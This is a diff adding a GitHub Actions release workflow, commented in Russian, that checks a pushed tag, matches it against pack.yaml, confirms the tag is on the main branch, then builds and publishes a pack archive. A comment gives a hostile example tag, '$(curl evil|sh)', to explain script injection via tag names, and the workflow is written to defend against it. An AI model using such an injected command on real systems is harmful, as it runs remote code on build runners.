@@ -1,0 +1,347 @@
+name: Выпуск пака
+
+# Триггер широкий (tags: ['**']), а не сужен через paths, — намеренно.
+#
+# У тегов diff по файлам не всегда отражает, какой пак имелся в виду:
+# ретег без изменения файлов — обычное дело, а paths: работает от diff
+# коммитов, а не от содержимого метки. Точную маршрутизацию к конкретному
+# packs/<namespace>/<name>/ делает разбор САМОЙ МЕТКИ внутри job (см. job
+# resolve), а не фильтр триггера.
+#
+# Метка, не подходящая под схему namespace.name@version, — это не обязательно
+# ошибка, но и не редкий случай, который стоит замалчивать: job resolve
+# явно проваливается на такой метке, а не тихо завершается без работы. Тег,
+# созданный не для пака (например, служебный тег репозитория), пойдёт по
+# этому же workflow и будет отклонён с понятным сообщением — таков выбор
+# схемы, а не оплошность.
+#
+# Форки: публикация выпуска в принципе не зависит от pull_request — она
+# стартует только push'ем тега человеком с правом записи в ЭТОТ репозиторий.
+# Тег, поставленный в форке, не порождает событие push в родительском
+# репозитории, так что этот workflow форкам вообще не виден.
+on:
+  push:
+    tags:
+      - "**"
+
+# Базовые права всего workflow — только чтение. Job, которому нужно писать
+# (создавать релиз), поднимает contents: write отдельно и только себе.
+permissions:
+  contents: read
+
+jobs:
+  resolve:
+    name: Разобрать метку и найти пак
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+    outputs:
+      namespace: ${{ steps.parse.outputs.namespace }}
+      name: ${{ steps.parse.outputs.name }}
+      version: ${{ steps.parse.outputs.version }}
+      pack_dir: ${{ steps.parse.outputs.pack_dir }}
+    steps:
+      # fetch-depth по умолчанию (1): version и так приходит из метки и из
+      # pack.yaml на этом коммите, а не из git log. Проверка «метка стоит на
+      # main» ниже сделана через API сравнения GitHub, а не через локальный
+      # git merge-base, — значит полная история здесь тоже не нужна.
+      - name: Получить дерево на метке
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+
+      - name: Python
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
+        with:
+          python-version: "3.12.7"
+
+      # Метку из push-события нельзя просто доверять: значение github.ref_name
+      # подставляется в текст ${{ }} ДО того, как шелл увидит run-скрипт —
+      # значит метка вида "$(curl evil|sh)" исполнилась бы, если вставить её
+      # прямо в run: как ${{ github.ref_name }}. Поэтому она приходит только
+      # через env и разворачивается шеллом как ДАННЫЕ (везде "$TAG" в
+      # кавычках, никогда голым), а Python читает её из os.environ, а не из
+      # argv, собранного текстовой подстановкой.
+      - name: Разобрать и проверить метку по схеме
+        id: parse
+        env:
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import os
+          import re
+          import sys
+
+          tag = os.environ["TAG"]
+
+          # Оговорка схемы: у ВЕРСИЯ число цифр не ограничено, поэтому в
+          # патологическом случае итоговая метка теоретически может
+          # превысить предел regex площадки {1,128}. Явная проверка здесь —
+          # а не расчёт на то, что так никто не сделает.
+          if len(tag) > 128:
+              sys.exit(f"метка длиннее 128 знаков ({len(tag)}): {tag!r}")
+
+          m = re.fullmatch(
+              r"(?P<ns>[a-z][a-z0-9-]{1,62}[a-z0-9])\."
+              r"(?P<name>[a-z][a-z0-9-]{1,62}[a-z0-9])@"
+              r"(?P<version>\d+\.\d+\.\d+)",
+              tag,
+          )
+          if not m:
+              sys.exit(
+                  "метка не по схеме namespace.name@version "
+                  f"(namespace/name — [a-z][a-z0-9-]{{1,62}}[a-z0-9], "
+                  f"version — \\d+.\\d+.\\d+): {tag!r}"
+              )
+
+          namespace, name, version = m["ns"], m["name"], m["version"]
+          pack_dir = f"packs/{namespace}/{name}"
+
+          print(f"метка разобрана: namespace={namespace} name={name} version={version}")
+
+          with open(os.environ["GITHUB_OUTPUT"], "a") as f:
+              f.write(f"namespace={namespace}\n")
+              f.write(f"name={name}\n")
+              f.write(f"version={version}\n")
+              f.write(f"pack_dir={pack_dir}\n")
+          PY
+
+      # Иначе можно потегировать что угодно на что угодно и получить релиз,
+      # чьё имя не соответствует содержимому: разбор метки выше называет
+      # ПУТЬ, но не гарантирует, что там лежит то, что метка обещает.
+      - name: Сверить pack.yaml с меткой
+        env:
+          NAMESPACE: ${{ steps.parse.outputs.namespace }}
+          NAME: ${{ steps.parse.outputs.name }}
+          VERSION: ${{ steps.parse.outputs.version }}
+          PACK_DIR: ${{ steps.parse.outputs.pack_dir }}
+        run: |
+          set -euo pipefail
+          if [ ! -f "$PACK_DIR/pack.yaml" ]; then
+            echo "по метке ожидался файл $PACK_DIR/pack.yaml на этом коммите, а его нет" >&2
+            exit 1
+          fi
+          python3 - <<'PY'
+          import os
+          import re
+          import sys
+
+          pack_dir = os.environ["PACK_DIR"]
+          namespace = os.environ["NAMESPACE"]
+          name = os.environ["NAME"]
+          version = os.environ["VERSION"]
+
+          with open(f"{pack_dir}/pack.yaml", "r", encoding="utf-8") as f:
+              text = f.read()
+
+          # namespace/name/version лежат ВНУТРИ metadata:, с отступом (см.
+          # docs/format.md и packs/example/letter-triage/pack.yaml) — искать
+          # их по всему файлу без разбора на блок metadata: опасно: у
+          # коннектора в spec.components.connectors[] тоже есть поле `name`.
+          m_meta = re.search(
+              r"(?m)^metadata:\n((?:[ \t]+\S[^\n]*\n?|[ \t]*\n)+)", text)
+          metadata_text = m_meta.group(1) if m_meta else ""
+
+          def field(key):
+              # Хвостовой "# комментарий" в YAML-строке — не редкость,
+              # допускаем его после значения. Отступ перед ключом —
+              # произвольный (поле лежит вложенным под metadata:).
+              m = re.search(
+                  rf"(?m)^[ \t]+{key}:[ \t]*(\S+)[ \t]*(?:#.*)?$", metadata_text)
+              return m.group(1).strip("\"'") if m else None
+
+          got = {
+              "namespace": field("namespace"),
+              "name": field("name"),
+              "version": field("version"),
+          }
+          expected = {"namespace": namespace, "name": name, "version": version}
+
+          errors = [
+              f"{key}: в pack.yaml={got[key]!r}, в метке={expected[key]!r}"
+              for key in expected
+              if got[key] != expected[key]
+          ]
+          if errors:
+              sys.exit("метка не соответствует pack.yaml:\n" + "\n".join(errors))
+
+          print(f"pack.yaml соответствует метке: {namespace}/{name}@{version}")
+          PY
+
+      # «Метка стоит на коммите из main»: сравниваем через API GitHub, а не
+      # локальным git merge-base, — чтобы не тянуть полную историю только
+      # ради одной проверки (см. fetch-depth выше). base...head со стороны
+      # base=default-ветка: status «identical» — та же самая метка, что и
+      # верхушка; «behind» — коммит метки старше и уже слит в основную ветку;
+      # «ahead»/«diverged» — коммит метки НЕ является предком основной ветки
+      # (например, метка поставлена на фиче-ветке до слияния) — отказ.
+      - name: Проверить, что метка стоит на коммите из основной ветки
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+        run: |
+          set -euo pipefail
+          STATUS="$(gh api "repos/${REPO}/compare/${DEFAULT_BRANCH}...${SHA}" --jq .status)"
+          echo "compare ${DEFAULT_BRANCH}...${SHA}: status=${STATUS}"
+          case "$STATUS" in
+            identical|behind)
+              echo "метка на коммите из ${DEFAULT_BRANCH} — годится"
+              ;;
+            *)
+              echo "метка стоит на коммите, которого нет в ${DEFAULT_BRANCH} (status=${STATUS}) — отказ" >&2
+              exit 1
+              ;;
+          esac
+
+  release:
+    name: Собрать и опубликовать релиз
+    needs: resolve
+    runs-on: ubuntu-24.04
+    # contents: write — и только это (никаких packages/id-token/actions):
+    # минимум, достаточный ровно для gh release create и заливки ассета.
+    permissions:
+      contents: write
+    # Повторный/параллельный прогон по той же метке не должен устроить гонку
+    # за один и тот же релиз: второй прогон просто ждёт первого, а не
+    # отменяет его (cancel-in-progress: false) — если первый уже создал
+    # релиз, второй упадёт на явной проверке ниже, а не перезалит файл.
+    concurrency:
+      group: release-${{ github.ref_name }}
+      cancel-in-progress: false
+    steps:
+      - name: Получить дерево на метке
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+
+      # Явная версия, а не образ раннера: от неё зависит tarfile/gzip/zlib,
+      # то есть побайтовая повторяемость сборки (см. оговорку в
+      # tools/pack.py, рядом с _собрать_tar_gz — полной гарантии «как на
+      # маке автора» это не даёт, но убирает дрейф хотя бы со стороны раннера).
+      - name: Python
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
+        with:
+          python-version: "3.12.7"
+
+      # Метку, для которой выпуск уже есть, не перезаливаем: файл выпуска
+      # должен быть неизменным (иначе отпечаток, который автор вручную вносит
+      # на площадке, разойдётся с тем, что реально лежит по ссылке). Эта
+      # проверка — понятное сообщение; окончательный барьер — сам
+      # `gh release create` без --clobber чуть ниже.
+      - name: Отказаться, если релиз с этой меткой уже есть
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          if gh release view "$TAG" --repo "$REPO" >/dev/null 2>&1; then
+            echo "релиз с меткой ${TAG} уже существует — файл выпуска неизменен, повторно не заливаем" >&2
+            exit 1
+          fi
+          echo "релиза с меткой ${TAG} ещё нет — можно собирать"
+
+      - name: pack.py check — те же локальные проверки перед сборкой
+        env:
+          PACK_DIR: ${{ needs.resolve.outputs.pack_dir }}
+        run: |
+          set -euo pipefail
+          python3 tools/pack.py check "$PACK_DIR"
+
+      - name: pack.py build — собрать архив выпуска
+        id: build
+        env:
+          PACK_DIR: ${{ needs.resolve.outputs.pack_dir }}
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          python3 tools/pack.py build "$PACK_DIR" --out dist | tee build.json
+          python3 - <<'PY'
+          import json
+          import os
+
+          data = json.load(open("build.json"))
+          with open(os.environ["GITHUB_OUTPUT"], "a") as f:
+              for key in ("file", "sha256", "size", "tag", "namespace", "name", "version"):
+                  f.write(f"{key}={data[key]}\n")
+          PY
+
+      # Собранная сборкой метка (namespace.name@version по pack.yaml) должна
+      # буквально совпасть с меткой, которой создаётся выпуск, — это вторая,
+      # независимая сверка того же самого, что уже проверил job resolve
+      # (там — из github.ref_name напрямую, здесь — из вывода tools/pack.py).
+      - name: Сверить метку сборки с меткой выпуска
+        env:
+          BUILD_TAG: ${{ steps.build.outputs.tag }}
+          RELEASE_TAG: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          if [ "$BUILD_TAG" != "$RELEASE_TAG" ]; then
+            echo "метка сборки (${BUILD_TAG}) не совпадает с меткой выпуска (${RELEASE_TAG})" >&2
+            exit 1
+          fi
+
+      # sha256 — то самое значение, которое автор потом вручную вводит как
+      # declared_digest на площадке: печатаем в сводку открытым текстом,
+      # чтобы его было удобно скопировать без пересчёта руками.
+      - name: Итог сборки в сводку запуска
+        env:
+          SHA256: ${{ steps.build.outputs.sha256 }}
+          SIZE: ${{ steps.build.outputs.size }}
+          FILE: ${{ steps.build.outputs.file }}
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          {
+            echo "### Сборка выпуска ${TAG}"
+            echo ""
+            echo "- файл: \`${FILE}\`"
+            echo "- размер: ${SIZE} байт"
+            echo "- sha256: \`${SHA256}\`"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Собрать описание выпуска
+        env:
+          OWNER_REPO: ${{ github.repository }}
+          TAG: ${{ github.ref_name }}
+          FILE: ${{ steps.build.outputs.file }}
+          SHA256: ${{ steps.build.outputs.sha256 }}
+          SIZE: ${{ steps.build.outputs.size }}
+          NAMESPACE: ${{ steps.build.outputs.namespace }}
+          NAME: ${{ steps.build.outputs.name }}
+          VERSION: ${{ steps.build.outputs.version }}
+        run: |
+          set -euo pipefail
+          ASSET_NAME="$(basename "$FILE")"
+          URL="https://github.com/${OWNER_REPO}/releases/download/${TAG}/${ASSET_NAME}"
+          {
+            echo "Пак \`${NAMESPACE}/${NAME}\`, версия \`${VERSION}\`."
+            echo ""
+            echo "| Поле | Значение |"
+            echo "|---|---|"
+            echo "| sha256 | \`${SHA256}\` |"
+            echo "| размер | ${SIZE} байт |"
+            echo "| ссылка на файл | ${URL} |"
+            echo ""
+            echo "Куда вставить ссылку и sha256:"
+            echo ""
+            echo "- в кабинете автора: https://agrigate.pro/pak/kabinet/;"
+            echo "- через дверь API: \`POST /registry/artifacts/from-github\`."
+          } > release-notes.md
+          cat release-notes.md >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Опубликовать релиз (без --clobber)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          TAG: ${{ github.ref_name }}
+          FILE: ${{ steps.build.outputs.file }}
+        run: |
+          set -euo pipefail
+          gh release create "$TAG" "$FILE" \
+            --repo "$REPO" \
+            --title "$TAG" \
+            --notes-file release-notes.md
